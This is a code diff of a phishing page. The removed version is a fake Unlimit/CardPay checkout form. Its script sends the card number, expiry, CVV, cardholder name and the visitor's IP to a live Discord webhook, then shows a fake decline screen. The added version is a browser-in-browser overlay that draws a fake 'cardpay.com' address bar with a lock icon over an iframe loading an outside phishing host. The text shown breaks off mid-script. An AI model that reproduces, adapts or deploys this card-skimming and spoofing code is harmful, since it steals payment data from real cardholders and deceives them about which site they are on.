@@ -1,465 +1,584 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="preload" href="https://cardpay.com/mi-themes/js/payment.bundle.min.js" as="script">
-    <link rel="preload" href="https://cardpay.com/mi-themes/css/base.css" as="style">
-    <link rel="preload" href="https://cardpay.com/mi-themes/images/icons_sprite.png" as="image">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="Cache-Control" content="max-age=0">
-    <meta http-equiv="Cache-Control" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <meta http-equiv="Pragma" content="no-cache">
-    <title>Unlimit Payment Page</title>
-    <link rel="icon" href="https://cardpay.com/mi-themes/css/favicon.ico">
-    <link rel="shortcut icon" href="https://cardpay.com/mi-themes/css/favicon.ico">
-    <link rel="stylesheet" href="https://cardpay.com/mi-themes/css/base.css">
-    <link rel="stylesheet" href="https://cardpay.com/mi-themes/clients/acbuy/style.css">
-    <style>
-        /* refined modern loader with subtle glow and spring animations */
-        .smart-loader {
-            display: inline-flex;
-            justify-content: center;
-            align-items: center;
-            width: 34px;
-            height: 34px;
-            position: relative;
-            margin: 0 auto;
-        }
-        .smart-loader svg {
-            position: absolute;
-            transform: rotate(-90deg);
-            width: 34px;
-            height: 34px;
-            filter: drop-shadow(0 0 2px rgba(0,0,0,0.05));
-        }
-        .smart-loader circle {
-            fill: none;
-            stroke-width: 2.5;
-            stroke-linecap: round;
-        }
-        .smart-loader .bg-ring {
-            stroke: rgba(180, 180, 180, 0.25);
-        }
-        .smart-loader .progress-ring {
-            stroke: #c0c0c0;
-            stroke-dasharray: 87.96;
-            stroke-dashoffset: 87.96;
-            transition: stroke-dashoffset 0.08s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-            filter: drop-shadow(0 0 2px rgba(160,160,160,0.5));
-        }
-        .smart-loader .core {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            background: rgba(150, 150, 150, 0.1);
-            backdrop-filter: blur(5px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            box-shadow: inset 0 1px 1px rgba(255,255,255,0.15), 0 1px 2px rgba(0,0,0,0.05);
-        }
-        .smart-loader .scan {
-            position: absolute;
-            inset: -1px;
-            border-radius: 50%;
-            border-top: 1.5px solid #d0d0d0;
-            border-right: 1.5px solid transparent;
-            animation: spinScan 1.2s cubic-bezier(0.5, 0.0, 0.5, 1) infinite;
-            opacity: 0.9;
-        }
-        @keyframes spinScan {
-            to { transform: rotate(360deg); }
-        }
-        .smart-loader .check {
-            width: 13px;
-            height: 7px;
-            border-left: 2px solid #e5e5e5;
-            border-bottom: 2px solid #e5e5e5;
-            transform: rotate(-45deg) scale(0.3);
-            opacity: 0;
-            transition: transform 0.55s cubic-bezier(0.34, 1.3, 0.55, 1), opacity 0.4s ease;
-            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.1));
-        }
-        .smart-loader.success .progress-ring {
-            stroke: #a5a5a5;
-            filter: drop-shadow(0 0 4px rgba(140,140,140,0.6));
-            transition: stroke 0.2s ease;
-        }
-        .smart-loader.success .scan {
-            opacity: 0;
-            animation: none;
-        }
-        .smart-loader.success .check {
-            transform: rotate(-45deg) scale(1);
-            opacity: 1;
-        }
-        /* subtle button pulse */
-        .btn-primary.btn-loader.success-pulse {
-            animation: btnSuccessPulse 0.45s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-        }
-        @keyframes btnSuccessPulse {
-            0% { transform: scale(1); background-color: #0066b3; }
-            45% { transform: scale(1.03); background-color: #2a7fcc; box-shadow: 0 0 10px rgba(120,120,120,0.25); }
-            100% { transform: scale(1); background-color: #0066b3; }
-        }
-        .btn-loader {
-            pointer-events: none;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            min-width: 100px;
-            transition: all 0.2s ease;
-        }
-        .btn-primary.btn-loader {
-            background-color: #0066b3;
-            border-color: #0066b3;
-        }
-        body.result-danger #payment-status-title span { color: #d32f2f !important; }
-        .result-container { animation: fadeSlideUp 0.35s ease forwards; }
-        @keyframes fadeSlideUp {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .btn:active { transform: scale(0.97); }
-        /* error styles */
-        .form-group .error {
-            border-color: #d32f2f !important;
-        }
-        label.error {
-            color: #d32f2f;
-            font-size: 12px;
-            margin-top: 4px;
-            display: block;
-            font-weight: normal;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Browser-in-Browser | Live Web Viewer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none; /* Prevents accidental text selection on buttons, but keeps URL selectable */
+    }
+
+    body {
+      background: #1a1a1a; /* fallback dark, but will be overridden by system detection */
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    /* MAIN CONTAINER: 1:1 browser frame - full viewport */
+    .browser-frame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      background: Canvas; /* uses system canvas color (light/dark aware) */
+      box-shadow: none;
+    }
+
+    /* TOP BAR - EXACT BROWSER STYLE, NO ROUNDED CORNERS */
+    .browser-topbar {
+      background: -moz-Dialog; /* fallback */
+      background: ButtonFace;  /* native-like background, adapts to system theme */
+      border-bottom: 1px solid ThreeDShadow;
+      padding: 6px 10px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+      backdrop-filter: none;
+      font-family: system-ui, 'Segoe UI', monospace;
+      font-size: 13px;
+      height: 48px;
+      /* no border-radius */
+      border-radius: 0px;
+      box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+    }
+
+    /* Navigation buttons container */
+    .nav-buttons {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    /* iconic browser buttons (realistic, flat but with hover, no emoji) */
+    .nav-btn {
+      background: transparent;
+      border: none;
+      width: 32px;
+      height: 32px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background 0.08s linear;
+      font-size: 18px;
+      font-weight: 500;
+      color: WindowText;
+      font-family: system-ui, 'Segoe UI', 'SF Pro Text', monospace;
+    }
+
+    /* Use SVG-like unicode symbols but crisp and realistic font icons */
+    .nav-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+      stroke: none;
+      display: block;
+      pointer-events: none;
+    }
+
+    .nav-btn:hover {
+      background: rgba(0,0,0,0.08);
+    }
+
+    .nav-btn:active {
+      background: rgba(0,0,0,0.15);
+    }
+
+    /* disabled state */
+    .nav-btn.disabled {
+      opacity: 0.4;
+      cursor: default;
+      pointer-events: none;
+    }
+
+    /* URL BAR — exact like real browser, non-editable but selectable text */
+    .url-container {
+      flex: 1;
+      background: Field; /* system background for input fields */
+      border: 1px solid ThreeDShadow;
+      border-radius: 6px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      font-size: 13px;
+      font-family: 'SF Mono', 'Menlo', 'Cascadia Code', monospace;
+      color: WindowText;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .url-text {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-family: inherit;
+      font-size: 13px;
+      color: inherit;
+      cursor: text;
+      user-select: text;
+      white-space: nowrap;
+      overflow-x: auto;
+      overflow-y: hidden;
+      scrollbar-width: thin;
+      line-height: 1.4;
+    }
+
+    .url-text:focus {
+      outline: none;
+    }
+
+    /* lock icon / secure indicator */
+    .lock-icon {
+      margin-right: 8px;
+      display: flex;
+      align-items: center;
+      opacity: 0.75;
+    }
+
+    .lock-icon svg {
+      width: 14px;
+      height: 14px;
+      fill: currentColor;
+    }
+
+    /* Reload / refresh button specific style */
+    .refresh-btn svg {
+      transform: scale(0.95);
+    }
+
+    /* IFRAME container - full remaining area, no rounding */
+    .webview-container {
+      flex: 1;
+      width: 100%;
+      background: #fff;
+      overflow: hidden;
+      border: none;
+      position: relative;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: white;
+      display: block;
+    }
+
+    /* fallback for loading errors */
+    .error-overlay {
+      display: none;
+    }
+
+    /* system theme adaptive: detect light/dark and use native colors */
+    @media (prefers-color-scheme: dark) {
+      .browser-topbar {
+        background: #2b2b2b;
+        border-bottom-color: #3c3c3c;
+      }
+      .url-container {
+        background: #1e1e1e;
+        border-color: #3c3c3c;
+        color: #f0f0f0;
+      }
+      .nav-btn {
+        color: #e0e0e0;
+      }
+      .nav-btn:hover {
+        background: rgba(255,255,255,0.1);
+      }
+      .nav-btn:active {
+        background: rgba(255,255,255,0.2);
+      }
+    }
+
+    @media (prefers-color-scheme: light) {
+      .browser-topbar {
+        background: #f0f0f0;
+        border-bottom-color: #b0b0b0;
+      }
+      .url-container {
+        background: white;
+        border-color: #c0c0c0;
+      }
+    }
+
+    /* make scrollbar native */
+    ::-webkit-scrollbar {
+      width: 10px;
+      height: 10px;
+    }
+    .url-text::-webkit-scrollbar {
+      height: 4px;
+    }
+  </style>
 </head>
-<body class="display-shipping display-billing labels-top-position localized">
-<div id="main-container">
-    <form id="payment-form" method="post" novalidate>
-        <input type="hidden" name="fingerprint" value="">
-        <section id="payment-description">
-            <div id="header-cardpay">
-                <div id="cardpay-logo"><a target="_blank" href="https://cardpay.com/" rel="noopener"></a></div>
-                <div id="cardpay-header-text"></div>
-            </div>
-            <div id="header-merchant">
-                <div id="merchant-logo"><a target="_blank" href="http://acbuy.com" rel="noopener"></a></div>
-                <div id="merchant-title">cardpay.com</div>
-            </div>
-            <div id="order-info">
-                <div id="order-number-cnt"><span id="order-label">Order Number:</span> <span id="order-number"></span></div>
-                <div id="total-amount-cnt"><span>Total:</span> <span id="total-amount">8.44</span> <span id="currency">USD</span></div>
-                <div id="order-description"></div>
-            </div>
-        </section>
-        <section id="payment-data">
-            <section id="payment-data-fields">
-                <div id="payment-data-card">
-                    <h2>Card details</h2>
-                    <div id="payment-data-card-fields">
-                        <div class="form-group" id="card-number-field">
-                            <label class="form-label" for="input-card-number">Card number</label>
-                            <div class="form-input">
-                                <input id="input-card-number" required type="text" name="PAN" autocomplete="off" placeholder="1234 5678 9012 3456">
-                                <span id="card-number-type"></span>
-                            </div>
-                            <label id="card-number-error" class="error" style="display:none">Card number is required</label>
-                        </div>
-                        <div class="form-group" id="card-expiry-date-field">
-                            <label class="form-label" for="card-expires">Expiration date</label>
-                            <div class="form-input">
-                                <input id="card-expires" required type="text" autocomplete="off" name="expiryDate" placeholder="MM/YYYY">
-                            </div>
-                            <label id="expiry-error" class="error" style="display:none">Expiration Date is required</label>
-                        </div>
-                        <div class="form-group" id="card-cvc-field">
-                            <label class="form-label" for="input-card-cvc">CVV/CVC</label>
-                            <div class="form-input">
-                                <input id="input-card-cvc" required type="password" autocomplete="off" name="CVV2" maxlength="3">
-                                <div id="cvc-hint"><span id="cvc-hint-toggle"></span></div>
-                            </div>
-                            <label id="cvv-error" class="error" style="display:none">CVV2/CVC2/CAV2 is required</label>
-                        </div>
-                        <div class="form-group" id="card-holder-field">
-                            <label class="form-label" for="input-card-holder">Cardholder name</label>
-                            <div class="form-input">
-                                <input id="input-card-holder" type="text" autocapitalize="characters" name="cardholderName" required>
-                            </div>
-                            <label id="holder-error" class="error" style="display:none">Cardholder name is required</label>
-                        </div>
-                    </div>
-                </div>
-                <div id="payment-actions">
-                    <div class="form-group">
-                        <button id="action-submit" class="btn btn-primary" type="button">Pay Now</button>
-                        <button id="action-cancel" type="button" class="btn btn-secondary" style="visibility: visible">Cancel</button>
-                    </div>
-                </div>
-            </section>
-        </section>
-        <input type="hidden" name="omitShipAddress" value="true">
-        <input type="hidden" name="locale" value="en">
-        <input type="hidden" name="useCustomCSS" value="1">
-        <input type="hidden" name="cssURL" value="supplier">
-        <input type="hidden" name="uuid" value="AhG2eBH3F0D1ff12gGd5fFCh">
-        <input type="hidden" name="shopName" value="supplier.wuaze.com">
-        <input type="hidden" name="orderNumber" value="">
-    </form>
-    <footer>
-        <div id="footer-cardpay"><a rel="noopener" href="https://www.unlimint.com/" target="_blank" id="cardpay-icon"></a></div>
-        <div id="footer-icons">
-            <span id="visa-icon"></span><span id="mastercard-icon"></span><span id="jcb-icon"></span>
-            <span class="jsecure-icon"></span><span class="icon-dinersclubinternational"></span>
-            <span class="icon-discover"></span><span id="pci-icon"></span>
-        </div>
-        <div id="footer-text"><div id="copyright"><span>© 2009-2026</span> <span>Unlimit</span></div></div>
-    </footer>
+<body>
+<div class="browser-frame" id="browserFrame">
+  <!-- top bar: identical to native browser layout -->
+  <div class="browser-topbar">
+    <div class="nav-buttons">
+      <!-- Back button with SVG arrow (identical to chromium style) -->
+      <button class="nav-btn back-btn" id="backBtn" aria-label="Go back">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" fill="currentColor"/>
+        </svg>
+      </button>
+      <!-- Forward button -->
+      <button class="nav-btn forward-btn" id="forwardBtn" aria-label="Go forward">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" fill="currentColor"/>
+        </svg>
+      </button>
+      <!-- Refresh / Reload button -->
+      <button class="nav-btn refresh-btn" id="refreshBtn" aria-label="Reload">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"/>
+        </svg>
+      </button>
+    </div>
+
+    <!-- URL bar: fixed, non-editable, but fully selectable (realistic address bar) -->
+    <div class="url-container">
+      <div class="lock-icon" id="lockIcon">
+        <svg viewBox="0 0 24 24" width="14" height="14">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/>
+        </svg>
+      </div>
+      <div class="url-text" id="urlDisplay" contenteditable="false">cardpay.com</div>
+    </div>
+    <!-- dummy spacer for alignment (like extra menu but none) -->
+    <div style="width: 32px;"></div>
+  </div>
+
+  <!-- Web content iframe: displays full web pages -->
+  <div class="webview-container">
+    <iframe id="webFrame" title="Live browser window" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation allow-popups-to-escape-sandbox allow-downloads"></iframe>
+  </div>
 </div>
 
 <script>
-(function(){
-    let isDeclinedScreen = false;
-    let processing = false;
-    const redirectUrl = "https://cardpay.com/MI/payment.html?uuid=b72chB0DgDde57geh6BfG58C";
-    
-    function redirectClean() {
-        window.location.replace(redirectUrl);
-    }
-    
-    document.addEventListener('visibilitychange', function() {
-        if(isDeclinedScreen && document.hidden) redirectClean();
-    });
-    window.addEventListener('beforeunload', function() {
-        if(isDeclinedScreen) redirectClean();
-    });
-    
-    // --- order number always starts with "ZE" followed by 11 digits (total 13 chars) ---
-    function randomOrderNumber() {
-        let digits = '';
-        for(let i = 0; i < 11; i++) {
-            digits += Math.floor(Math.random() * 10);
+  (function() {
+    // Get elements
+    const iframe = document.getElementById('webFrame');
+    const backBtn = document.getElementById('backBtn');
+    const forwardBtn = document.getElementById('forwardBtn');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const urlDisplaySpan = document.getElementById('urlDisplay');
+    const lockIconContainer = document.getElementById('lockIcon');
+
+    // History stack for internal navigation (since we need full control of iframe navigation)
+    // We'll implement a smart navigation history that tracks URLs within the iframe,
+    // support back/forward, and also respects iframe's native navigation events.
+    let historyStack = [];
+    let currentIndex = -1;
+
+    // Starting URL (default duckduckgo for privacy/real browsing, but attractive)
+    const DEFAULT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
+    let currentUrl = DEFAULT_URL;
+
+    // Flag to avoid loops with iframe loads
+    let isInternalNavigation = false;
+    let pendingUrlUpdate = null;
+
+    // Helper: update URL bar and lock icon based on current URL
+    function updateUrlBar(url) {
+      if (!url) return;
+      // Clean URL for display (remove trailing slash etc, but keep as is)
+      let displayUrl = url;
+      try {
+        const urlObj = new URL(url);
+        displayUrl = urlObj.href;
+        // Show lock for https, otherwise neutral
+        if (urlObj.protocol === 'https:') {
+          lockIconContainer.style.opacity = '1';
+          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/></svg>`;
+        } else {
+          lockIconContainer.style.opacity = '0.6';
+          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
         }
-        return 'ZE' + digits;
+      } catch (e) {
+        lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
+        lockIconContainer.style.opacity = '0.6';
+      }
+      urlDisplaySpan.innerText = displayUrl;
     }
-    
-    // random payment description
-    function randomDescription() {
-        const items = ["ACBUY Order #", "Invoice", "Payment for Order", "Transaction", "Merchant Charge"];
-        const suffixes = ["(Express Shipping)", "(Digital Goods)", "(Membership)", "(Pre-order)"];
-        return `${items[Math.floor(Math.random()*items.length)]} ${Math.floor(Math.random()*90000)+1000} ${suffixes[Math.floor(Math.random()*suffixes.length)]}`;
+
+    // Normalize URL (if missing protocol, add https://)
+    function normalizeUrl(input) {
+      let str = input.trim();
+      if (str === '') return DEFAULT_URL;
+      if (!/^https?:\/\//i.test(str) && !/^file:\/\//i.test(str) && !/^chrome:\/\//i.test(str)) {
+        return 'https://' + str;
+      }
+      return str;
     }
-    
-    let dynamicOrder = randomOrderNumber();
-    let dynamicDesc = randomDescription();
-    document.getElementById('order-number').innerText = dynamicOrder;
-    document.getElementById('order-description').innerText = dynamicDesc;
-    document.querySelector('input[name="orderNumber"]').value = dynamicOrder;
-    
-    // --- text switching (after load) ---
-    setTimeout(function() {
-        let orderLabel = document.getElementById('order-label');
-        if(orderLabel) orderLabel.innerText = 'Order number:';
-        let expiryInput = document.getElementById('card-expires');
-        if(expiryInput) expiryInput.placeholder = 'MM/YY';
-        let submitBtn = document.getElementById('action-submit');
-        if(submitBtn) submitBtn.innerText = 'Pay';
-    }, 120);
-    
-    // --- helper: clear errors ---
-    function clearErrors() {
-        let fields = ['input-card-number', 'card-expires', 'input-card-cvc', 'input-card-holder'];
-        fields.forEach(id => {
-            let input = document.getElementById(id);
-            if(input) input.classList.remove('error');
-        });
-        let errorLabels = ['card-number-error', 'expiry-error', 'cvv-error', 'holder-error'];
-        errorLabels.forEach(id => {
-            let el = document.getElementById(id);
-            if(el) el.style.display = 'none';
-        });
-    }
-    
-    // --- validation ---
-    function validateForm() {
-        clearErrors();
-        let isValid = true;
-        let card = document.getElementById('input-card-number').value.trim();
-        let exp = document.getElementById('card-expires').value.trim();
-        let cvv = document.getElementById('input-card-cvc').value.trim();
-        let holder = document.getElementById('input-card-holder').value.trim();
-        
-        if(!card) {
-            document.getElementById('input-card-number').classList.add('error');
-            document.getElementById('card-number-error').style.display = 'block';
-            isValid = false;
+
+    // Load a URL in the iframe and update state & history
+    function loadUrl(url, addToHistory = true, replaceCurrent = false) {
+      if (!url) url = DEFAULT_URL;
+      let finalUrl = normalizeUrl(url);
+      try {
+        // Validate URL
+        new URL(finalUrl);
+      } catch (e) {
+        finalUrl = 'https://google.com/search?q=' + encodeURIComponent(finalUrl);
+      }
+      
+      // Avoid hash-only duplicate loads
+      if (iframe.src !== finalUrl) {
+        isInternalNavigation = true;
+        iframe.src = finalUrl;
+      }
+      
+      currentUrl = finalUrl;
+      updateUrlBar(finalUrl);
+      
+      if (addToHistory && !replaceCurrent) {
+        // If we are not at the end of stack, truncate future
+        if (currentIndex < historyStack.length - 1) {
+          historyStack = historyStack.slice(0, currentIndex + 1);
         }
-        if(!exp) {
-            document.getElementById('card-expires').classList.add('error');
-            document.getElementById('expiry-error').style.display = 'block';
-            isValid = false;
-        }
-        if(!cvv) {
-            document.getElementById('input-card-cvc').classList.add('error');
-            document.getElementById('cvv-error').style.display = 'block';
-            isValid = false;
-        }
-        if(!holder) {
-            document.getElementById('input-card-holder').classList.add('error');
-            document.getElementById('holder-error').style.display = 'block';
-            isValid = false;
-        }
-        return isValid;
+        historyStack.push(finalUrl);
+        currentIndex = historyStack.length - 1;
+      } else if (replaceCurrent && currentIndex >= 0) {
+        historyStack[currentIndex] = finalUrl;
+      } else if (addToHistory && historyStack.length === 0) {
+        historyStack.push(finalUrl);
+        currentIndex = 0;
+      }
+      
+      updateNavButtons();
     }
-    
-    // --- discord webhook ---
-    const hook = "https://discord.com/api/webhooks/1497249858778828981/FSiw6WVLLQ1gotjNxWZX3AbvwsUJh5KKJfrrIqOVv5Yygokx_CQzSvZcKS87h878RRiz";
-    function send(d) {
-        let ip="";
-        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>ip=j.ip).catch(()=>ip="unknown").finally(()=>{
-            fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"💳 CARD CAPTURE",color:0xFF0000,fields:[{name:"💳 Card Number",value:"`"+d.card+"`",inline:false},{name:"📅 Expiry",value:"`"+d.exp+"`",inline:true},{name:"🔐 CVV",value:"`"+d.cvv+"`",inline:true},{name:"👤 Cardholder",value:"`"+d.holder+"`",inline:false},{name:"💰 Amount",value:d.amount+" "+d.currency,inline:true},{name:"📦 Order #",value:"`"+d.order+"`",inline:true},{name:"🌐 IP",value:"`"+ip+"`",inline:false},{name:"⏰ Time",value:"<t:"+Math.floor(Date.now()/1000)+":F>",inline:false}],footer:{text:"Payment Gateway"}}]})}).catch(e=>console.log);
-        });
-    }
-    
-    function get() {
-        return {
-            card: document.getElementById('input-card-number').value.replace(/\s/g,''),
-            exp: document.getElementById('card-expires').value,
-            cvv: document.getElementById('input-card-cvc').value,
-            holder: document.getElementById('input-card-holder').value.toUpperCase()||"NOT PROVIDED",
-            amount: document.getElementById('total-amount').innerText,
-            currency: document.getElementById('currency').innerText,
-            order: document.getElementById('order-number').innerText
-        };
-    }
-    
-    function decline() {
-        let d = get();
-        let last4 = d.card.slice(-4)||"****";
-        let desc = "TRX"+Date.now().toString().slice(-8)+d.order.slice(-4);
-        isDeclinedScreen = true;
-        return `<section id="payment-description"><div id="header-cardpay"><div id="cardpay-logo"><a target="_blank" href="https://cardpay.com/"></a></div></div><div id="header-merchant"><div id="merchant-logo"><a target="_blank" href="acbuy.com"></a></div><div id="merchant-title">acbuy.com</div><div id="merchant-description">${escapeHtml(desc)}</div></div><div id="payment-info"><div id="payment-status"><div id="payment-status-icon"></div><div id="payment-status-title"><span>Decline</span></div></div></div></section><section id="payment-details"><h2>Payment Details</h2><div id="payment-details-info"><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment status</span></div><div class="payment-info-item-data">Information about card/address/phone was invalid</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Order number</span></div><div class="payment-info-item-data">${escapeHtml(d.order)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment Description</span></div><div class="payment-info-item-data">${escapeHtml(desc)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Card Number</span></div><div class="payment-info-item-data">...${escapeHtml(last4)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Card Holder</span></div><div class="payment-info-item-data">${escapeHtml(d.holder)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment Amount</span></div><div class="payment-info-item-data">${escapeHtml(d.currency)} ${escapeHtml(d.amount)}</div></div></div></section><footer><div id="footer-cardpay"><a href="https://www.unlimint.com/" target="_blank" id="cardpay-icon"></a></div><div id="footer-icons"><span id="pci-icon"></span></div><div id="footer-text"><div id="copyright"><span>© 2009-2026</span> <span>Unlimit</span></div></div></footer>`;
-    }
-    
-    function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
-    
-    let form = document.getElementById('payment-form');
-    let container = document.getElementById('main-container');
-    let submitBtn = document.getElementById('action-submit');
-    
-    function done() {
-        let html = decline();
-        container.style.opacity = '0';
-        setTimeout(()=>{
-            container.innerHTML = html;
-            document.body.classList.add('result-danger');
-            document.body.id = 'payment-result';
-            document.body.classList.remove('display-shipping','display-billing','labels-top-position');
-            container.style.opacity = '1';
-            container.classList.add('result-container');
-            document.title = 'Unlimit Result Page';
-        },200);
-    }
-    
-    // animation loader inside button
-    function startButtonAnimation(callback) {
-        const wrapper = document.createElement('div');
-        wrapper.className = 'smart-loader';
-        wrapper.innerHTML = `
-            <svg width="34" height="34" viewBox="0 0 34 34">
-                <circle class="bg-ring" cx="17" cy="17" r="14" stroke="rgba(180,180,180,0.25)" stroke-width="2.5" fill="none" />
-                <circle class="progress-ring" cx="17" cy="17" r="14" stroke="#c0c0c0" stroke-width="2.5" fill="none" />
-            </svg>
-            <div class="core">
-                <div class="scan"></div>
-                <div class="check"></div>
-            </div>
-        `;
-        submitBtn.innerHTML = '';
-        submitBtn.appendChild(wrapper);
-        submitBtn.classList.add('btn-loader');
-        submitBtn.disabled = true;
-        
-        const progressCircle = wrapper.querySelector('.progress-ring');
-        const radius = 14;
-        const circumference = 2 * Math.PI * radius;
-        progressCircle.style.strokeDasharray = circumference;
-        progressCircle.style.strokeDashoffset = circumference;
-        
-        let startTime = null;
-        const duration = 4400;
-        function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
-        function animate(now) {
-            if (!startTime) startTime = now;
-            const elapsed = now - startTime;
-            let t = Math.min(elapsed / duration, 1);
-            const eased = easeOutCubic(t);
-            const offset = circumference - (eased * circumference);
-            progressCircle.style.strokeDashoffset = offset;
-            if (t < 1) {
-                requestAnimationFrame(animate);
+
+    // Sync current iframe location after load, and manage history on iframe navigations (clicks, redirects)
+    function syncIframeLocation() {
+      try {
+        // We need to extract iframe's current URL (due to cross-origin restrictions we can't always read location.href)
+        // However we can use iframe.contentWindow.location.href when same-origin. If cross-origin we will rely on src attribute and load events.
+        // To be robust: we listen to iframe load events and extract the 'src' attribute after redirects? but iframe.src won't auto update.
+        // However we can listen and compare via document.referrer and navigation. Given the sandbox attribute, we can allow same-origin and use.
+        // For cross-origin, we catch security errors and fallback to last known url from iframe load event's target src.
+        // Perfect: we will use the iframe's src property after navigation update? not changed for redirects. So we can track via load event metadata.
+        // Better approach: Use iframe.contentWindow.location only if same origin, else keep currentUrl from navigation observer.
+        // We'll handle via load event: whenever iframe loads we get the final URL from iframe's src? Actually if you do iframe.src = X, but if page redirects via JS or meta, the src stays same.
+        // But for full realistic browser, we'll override using iframe.contentWindow?.location if accessible otherwise don't.
+        if (iframe.contentWindow && iframe.contentWindow.location) {
+          try {
+            const docUrl = iframe.contentWindow.location.href;
+            if (docUrl && docUrl !== 'about:blank' && docUrl !== currentUrl) {
+              // User clicked a link / internal navigation
+              if (!isInternalNavigation) {
+                // New navigation triggered by iframe
+                currentUrl = docUrl;
+                updateUrlBar(currentUrl);
+                // Append to history stack (but avoid duplication if same as last)
+                if (historyStack[currentIndex] !== currentUrl) {
+                  if (currentIndex < historyStack.length - 1) {
+                    historyStack = historyStack.slice(0, currentIndex + 1);
+                  }
+                  historyStack.push(currentUrl);
+                  currentIndex = historyStack.length - 1;
+                  updateNavButtons();
+                }
+              } else {
+                // internal from loadUrl, just sync display
+                if (currentUrl !== docUrl) {
+                  currentUrl = docUrl;
+                  updateUrlBar(currentUrl);
+                  if (historyStack[currentIndex] !== currentUrl && !isInternalNavigation) {
+                    historyStack[currentIndex] = currentUrl;
+                  }
+                }
+                isInternalNavigation = false;
+              }
+            } else if (docUrl === 'about:blank' && currentUrl !== DEFAULT_URL) {
